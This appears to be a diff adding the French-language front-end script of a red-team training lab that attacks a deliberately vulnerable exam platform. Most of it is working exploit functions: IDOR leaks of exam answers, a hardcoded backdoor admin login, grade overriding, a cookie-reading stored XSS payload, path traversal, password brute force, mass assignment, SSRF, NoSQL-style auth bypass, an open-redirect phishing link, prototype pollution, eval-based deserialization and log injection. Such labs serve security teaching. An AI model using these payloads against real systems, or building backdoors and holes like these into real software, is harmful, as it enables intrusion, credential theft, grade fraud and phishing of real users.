+        display.innerHTML = `<div style="color:#00ff41; margin-bottom:8px;">[+] BONNES RÉPONSES OBTENUES :</div><pre style="color:#ccc; font-size:11px; white-space:pre-wrap;">${escHtml(str)}</pre>`;
+        addLog(`[+] IDOR exploité ! Réponses exposées.`, 'success');
+    } catch(e) {
+        addLog(`[-] Erreur: ${e.message}`, 'error');
+    }
+}
+
+async function escaladerPrivileges() {
+    addLog('[*] Tentative connexion compte backdoor ctfadmin...');
+    try {
+        const res = await fetch('/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ nom: 'ctfadmin', motDePasse: 'R3dT3am2024' })
+        });
+        const data = await res.json();
+        if (data.token) {
+            adminToken = data.token;
+            document.getElementById('flag-privilege_escalation').value = data.token;
+            addLog(`[+] Connexion réussie ! Token admin obtenu.`, 'success');
+        } else {
+            addLog(`[-] Échec: ${JSON.stringify(data)}`, 'error');
+        }
+    } catch(e) {
+        addLog(`[-] Erreur: ${e.message}`, 'error');
+    }
+}
+
+async function accederDebug() {
+    addLog('[*] GET /api/debug ...');
+    try {
+        const res = await fetch('/api/debug');
+        const data = await res.json();
+        const str = JSON.stringify(data, null, 2);
+        document.getElementById('flag-c2').value = str;
+        const display = document.getElementById('debug-display');
+        display.style.display = 'block';
+        display.innerHTML = `<pre style="color:#00ff41; white-space:pre-wrap;">${escHtml(str)}</pre>`;
+        addLog('[+] Debug endpoint accédé ! Secrets exposés.', 'success');
+    } catch(e) {
+        addLog(`[-] Erreur: ${e.message}`, 'error');
+    }
+}
+
+async function accederStats() {
+    addLog('[*] GET /api/professeur/stats ...');
+    try {
+        const res = await fetch('/api/professeur/stats');
+        const data = await res.json();
+        const str = JSON.stringify(data, null, 2);
+        document.getElementById('flag-lateral_movement').value = str;
+        const display = document.getElementById('stats-display');
+        display.style.display = 'block';
+        display.innerHTML = `<pre style="color:#00ff41; white-space:pre-wrap;">${escHtml(str)}</pre>`;
+        addLog('[+] Stats obtenues sans authentification !', 'success');
+    } catch(e) {
+        addLog(`[-] Erreur: ${e.message}`, 'error');
+    }
+}
+
+async function modifierNote() {
+    const noteCible = parseFloat(document.getElementById('note-cible').value) || 20;
+    if (!sessionId) { addLog('[!] sessionId manquant', 'warning'); return; }
+    addLog(`[*] POST /api/examen/submit avec _note=${noteCible} ...`);
+    try {
+        const res = await fetch('/api/examen/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, reponses: { qcm: [], redaction: [], graphQcm: [] }, _note: noteCible })
+        });
+        const data = await res.json();
+        const str = JSON.stringify(data, null, 2);
+        document.getElementById('flag-actions').value = str;
+        const display = document.getElementById('note-display');
+        display.style.display = 'block';
+        if (data._overridden || data.noteSur20 === noteCible) {
+            display.innerHTML = `<div style="background:#001a00; border:1px solid #00ff41; border-radius:6px; padding:12px; color:#00ff41; font-size:13px;">[+] NOTE MODIFIÉE : <strong>${data.noteSur20}/20</strong> (override appliqué !)</div>`;
+            addLog(`[+] Note override réussi : ${data.noteSur20}/20 !`, 'success');
+        } else {
+            display.innerHTML = `<pre style="font-size:11px; color:#ccc;">${escHtml(str)}</pre>`;
+            addLog(`[*] Réponse reçue (vérifiez le résultat)`, 'warning');
+        }
+    } catch(e) {
+        addLog(`[-] Erreur: ${e.message}`, 'error');
+    }
+}
+
+async function chargerLeaderboard() {
+    const body = document.getElementById('leaderboard-body');
+    body.innerHTML = '<div style="color:#8b949e; padding:20px; text-align:center;">Chargement...</div>';
+    try {
+        const res = await fetch('/api/professeur/redteam');
+        const data = await res.json();
+        if (!data.length) { body.innerHTML = '<div style="color:#8b949e; padding:20px; text-align:center;">Aucun étudiant RedTeam pour l\'instant</div>'; return; }
+        body.innerHTML = data.map((s, i) => `
+            <div class="lb-row">
+                <div style="color:${i===0?'#ffd700':i===1?'#c0c0c0':i===2?'#cd7f32':'#8b949e'}">${i+1}</div>
+                <div style="color:#fff;">${escHtml(s.etudiant || '')}</div>
+                <div style="text-align:right; color:#00ff41; font-weight:bold;">${s.totalPoints}</div>
+                <div style="text-align:right; color:#8b949e;">${s.phasesCompleted}/7</div>
+            </div>`).join('');
+    } catch(e) {
+        body.innerHTML = `<div style="color:#ff4444; padding:20px; text-align:center;">Erreur: ${escHtml(e.message)}</div>`;
+    }
+}
+
+// ─── UI Helpers ────────────────────────────────────────────────────────────────
+function toggleHint(id) {
+    const el = document.getElementById(id);
+    el.style.display = el.style.display === 'block' ? 'none' : 'block';
+}
+
+function showTab(name) {
+    const tabs = ['mission', 'vulns', 'killchain', 'tools', 'leaderboard'];
+    document.querySelectorAll('.tab-btn').forEach((b, i) => {
+        b.classList.toggle('active', tabs[i] === name);
+    });
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.getElementById(`tab-${name}`).classList.add('active');
+    if (name === 'leaderboard') chargerLeaderboard();
+}
+
+function toggleCollapsible(btn) {
+    const content = btn.nextElementSibling;
+    const isOpen = content.classList.contains('open');
+    content.classList.toggle('open', !isOpen);
+    btn.textContent = isOpen ? '▼ Voir exploit' : '▲ Masquer';
+}
+
+// Mettre à jour les indicateurs mini Kill Chain dans le briefing
+function updateMiniKillChain() {
+    const phaseMap = {
+        reconnaissance: 'kc-mini-recon',
+        weaponization: 'kc-mini-weapon',
+        exploitation: 'kc-mini-exploit',
+        privilege_escalation: 'kc-mini-priv',
+        c2: 'kc-mini-c2',
+        lateral_movement: 'kc-mini-lateral',
+        actions: 'kc-mini-actions'
+    };
+    completedPhases.forEach(phase => {
+        const el = document.getElementById(phaseMap[phase]);
+        if (el) el.classList.add('kc-done');
+    });
+}
+
+function addLog(msg, type = 'info') {
+    const log = document.getElementById('console-log');
+    const entry = document.createElement('div');
+    entry.className = `log-entry ${type}`;
+    entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    log.appendChild(entry);
+    log.scrollTop = log.scrollHeight;
+}
+
+function escHtml(str) {
+    const d = document.createElement('div');
+    d.textContent = String(str ?? '');
+    return d.innerHTML;
+}
+
+// ─── VULN-011: Stored XSS helper ───────────────────────────────────────────────
+async function exploiterXSS() {
+    const payload = `<img src=x onerror="document.title='XSS by '+document.cookie">`;
+    addLog('[*] Soumission d\'une correction avec payload XSS...');
+    // Shown as info only — XSS fires when prof opens corrections tab
+    addLog(`[!] Payload: ${payload}`, 'warning');
+    addLog('[*] Côté professeur: ouvrir /professeur.html → Corrections pour déclencher le XSS', 'warning');
+    // Demo: afficher le payload dans la console
+    try {
+        if (!sessionId) { addLog('[!] sessionId manquant (requis pour IDOR)', 'warning'); return; }
+        const res = await fetch(`/api/professeur/corrections/raw?sessionId=${sessionId}`);
+        const data = await res.json();
+        addLog(`[+] Endpoint XSS accessible: ${JSON.stringify(data).substring(0, 80)}...`, 'success');
+    } catch(e) {
+        addLog(`[-] Erreur: ${e.message}`, 'error');
+    }
+}
+
+// ─── VULN-012: Path Traversal helper ───────────────────────────────────────────
+async function pathTraversal() {
+    const fichier = document.getElementById('pt-input') ? document.getElementById('pt-input').value : '../exam-platformV3/users.json';
+    addLog(`[*] GET /api/export?fichier=${fichier}`);
+    try {
+        const res = await fetch(`/api/export?fichier=${encodeURIComponent(fichier)}`, {
+            headers: adminToken ? { 'Authorization': `Bearer ${adminToken}` } : {}
+        });
+        const text = await res.text();
+        let display = document.getElementById('pt-display');
+        if (display) {
+            display.style.display = 'block';
+            display.innerHTML = `<pre style="color:#00ff41; white-space:pre-wrap; font-size:11px;">${escHtml(text.substring(0, 2000))}</pre>`;
+        }
+        addLog(`[+] Path traversal réussi ! ${text.length} octets reçus.`, 'success');
+    } catch(e) {
+        addLog(`[-] Erreur: ${e.message}`, 'error');
+    }
+}
+
+// ─── VULN-013: Brute Force helper ──────────────────────────────────────────────
+async function bruteForce() {
+    const cibles = ['prof.martin', 'examens.ensam'];
+    const passwords = ['password', 'ensam2024', '123456', 'admin', 'prof2024'];
+    addLog('[*] Démarrage brute force (liste courte)...');
+    for (const user of cibles) {
+        for (const pwd of passwords) {
+            try {
+                const res = await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: user, password: pwd })
+                });
+                const data = await res.json();
+                if (data.token) {
+                    addLog(`[+] SUCCÈS ! ${user}:${pwd} → token obtenu !`, 'success');
+                    adminToken = data.token;
+                    return;
+                } else {
+                    addLog(`[-] ${user}:${pwd} → échec`, 'error');
+                }
+            } catch(e) { addLog(`[-] Erreur réseau`, 'error'); }
+        }
+    }
+}
+
+// ─── VULN-014: Mass Assignment helper ──────────────────────────────────────────
+async function massAssignment() {
+    addLog('[*] PUT /api/profil/update avec role=admin...');
+    const token = adminToken || localStorage.getItem('token') || '';
+    try {
+        const res = await fetch('/api/profil/update', {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+            body: JSON.stringify({ nom: 'Hacker', role: 'admin', _isAdmin: true })
+        });
+        const data = await res.json();
+        const str = JSON.stringify(data, null, 2);
+        addLog(`[+] Mass assignment: ${str.substring(0, 120)}`, 'success');
+        let display = document.getElementById('ma-display');
+        if (display) { display.style.display='block'; display.innerHTML=`<pre style="color:#00ff41; font-size:11px;">${escHtml(str)}</pre>`; }
+    } catch(e) { addLog(`[-] Erreur: ${e.message}`, 'error'); }
+}
+
+// ─── VULN-015: SSRF helper ─────────────────────────────────────────────────────
+async function exploiterSSRF() {
+    const url = document.getElementById('ssrf-url') ? document.getElementById('ssrf-url').value : 'http://localhost:3003/api/debug';
+    addLog(`[*] POST /api/webhook/test → url=${url}`);
+    const token = adminToken || '';
+    try {
+        const res = await fetch('/api/webhook/test', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+            body: JSON.stringify({ url })
+        });
+        const data = await res.json();
+        const str = JSON.stringify(data, null, 2);
+        addLog(`[+] SSRF réponse: ${str.substring(0, 120)}`, 'success');
+        let display = document.getElementById('ssrf-display');
+        if (display) { display.style.display='block'; display.innerHTML=`<pre style="color:#00ff41; font-size:11px;">${escHtml(str)}</pre>`; }
+    } catch(e) { addLog(`[-] Erreur: ${e.message}`, 'error'); }
+}
+
+// ─── VULN-016: Auth Bypass (Type Confusion) ────────────────────────────────────
+async function authBypass() {
+    addLog('[*] POST /api/auth/login avec motDePasse={"$ne":""} (injection NoSQL-like)...');
+    try {
+        const res = await fetch('/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ nom: 'admin', motDePasse: { '$ne': '' } })
+        });
+        const data = await res.json();
+        if (data.token) {
+            adminToken = data.token;
+            addLog(`[+] AUTH BYPASS réussi ! Token admin: ${data.token.substring(0, 40)}...`, 'success');
+            addLog(`[*] Vuln déclenchée: ${data.vuln || 'VULN-016'}`, 'warning');
+        } else {
+            addLog(`[-] Échec: ${JSON.stringify(data)}`, 'error');
+        }
+    } catch(e) { addLog(`[-] Erreur: ${e.message}`, 'error'); }
+}
+
+// ─── VULN-017: Open Redirect helper ────────────────────────────────────────────
+async function openRedirect() {
+    const target = 'https://example.com/phishing-page';
+    addLog(`[*] Étape 1: obtenir un token via login...`);
+    try {
+        // Step 1: get a valid token (use weak password account)
+        const loginRes = await fetch('/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: 'prof.martin', password: 'password' })
+        });
+        const loginData = await loginRes.json();
+        if (!loginData.token) { addLog('[-] Login échoué', 'error'); return; }
+        addLog(`[+] Token obtenu`, 'success');
+        // Step 2: construct open redirect URL
+        const redirectUrl = `/api/auth/redirect?token=${loginData.token}&redirect=${encodeURIComponent(target)}`;
+        addLog(`[+] VULN-017 URL de phishing: ${redirectUrl}`, 'success');
+        addLog(`[!] Envoyer ce lien à la victime — elle sera redirigée vers: ${target}`, 'warning');
+        // Show the redirect URL
+        let display = document.getElementById('or-display');
+        if (display) {
+            display.style.display='block';
+            display.innerHTML=`<div style="padding:8px; color:#ffa500;">Lien de phishing:<br><code style="color:#00ff41; word-break:break-all;">http://[IP]:3003${redirectUrl}</code></div>`;
+        }
+    } catch(e) { addLog(`[-] Erreur: ${e.message}`, 'error'); }
+}
+
+// ─── VULN-018: Prototype Pollution ────────────────────────────────────────────
+async function exploiterProtoPollution() {
+    addLog('[*] POST /api/config/merge avec {"__proto__":{"isAdmin":true}}...');
+    const token = adminToken || '';
+    try {
+        const res = await fetch('/api/config/merge', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+            body: JSON.stringify({ '__proto__': { isAdmin: true, polluted: 'YES' }, theme: 'dark' })
+        });
+        const data = await res.json();
+        const str = JSON.stringify(data, null, 2);
+        addLog(`[+] Prototype Pollution: prototype_pollution_test=${data.prototype_pollution_test}`, data.prototype_pollution_test ? 'success' : 'warning');
+        addLog(`[*] Object.prototype pollué: ${JSON.stringify(data.appliedConfig)}`, 'warning');
+        let display = document.getElementById('proto-result');
+        if (display) { display.style.display='block'; display.innerHTML=`<pre style="color:#00ff41; font-size:11px;">${escHtml(str)}</pre>`; }
+    } catch(e) { addLog(`[-] Erreur: ${e.message}`, 'error'); }
+}
+
+// ─── VULN-019: Insecure Deserialization ────────────────────────────────────────
+async function exploiterDeserial() {
+    addLog('[*] POST /api/bases/import-unsafe avec payload eval...');
+    const token = adminToken || '';
+    // Payload: JSON with __eval__: prefix triggers eval() reviver (VULN-019)
+    const payload = '{"matiere":"test","type":"qcm","questions":[],"secret":"__eval__:process.version"}';
+    try {
+        const res = await fetch('/api/bases/import-unsafe', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+            body: JSON.stringify({ data: payload, filename: 'test.json' })
+        });
+        const data = await res.json();
+        const str = JSON.stringify(data, null, 2);
+        addLog(`[+] Désérialisation: ${str.substring(0, 150)}`, 'success');
+        let display = document.getElementById('deser-display');
+        if (display) { display.style.display='block'; display.innerHTML=`<pre style="color:#00ff41; font-size:11px;">${escHtml(str)}</pre>`; }
+    } catch(e) { addLog(`[-] Erreur: ${e.message}`, 'error'); }
+}
+
+// ─── VULN-020: Log Injection ────────────────────────────────────────────────────
+async function logInjection() {
+    addLog('[*] POST /api/feedback avec injection \\n dans le champ nom...');
+    const injectedNom = 'Hacker\n[FAKE AUDIT] 2024-01-01 admin CONNECTED FROM 1.2.3.4\n[FAKE]';
+    try {
+        const res = await fetch('/api/feedback', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ nom: injectedNom, message: 'Feedback normal', note: 5 })
+        });
+        const data = await res.json();
+        addLog(`[+] Log injection envoyée ! Vérifiez server.log côté serveur.`, 'success');
+        addLog(`[!] Payload injecté: ${injectedNom.replace(/\n/g, '\\n')}`, 'warning');
+        let display = document.getElementById('log-result');
+        if (display) { display.style.display='block'; display.innerHTML=`<div style="color:#ffa500; padding:8px;">Log injecté dans server.log — consultez le fichier de log côté serveur pour voir les fausses entrées.</div>`; }
+    } catch(e) { addLog(`[-] Erreur: ${e.message}`, 'error'); }
+}
+</script>
+</body>
+</html>
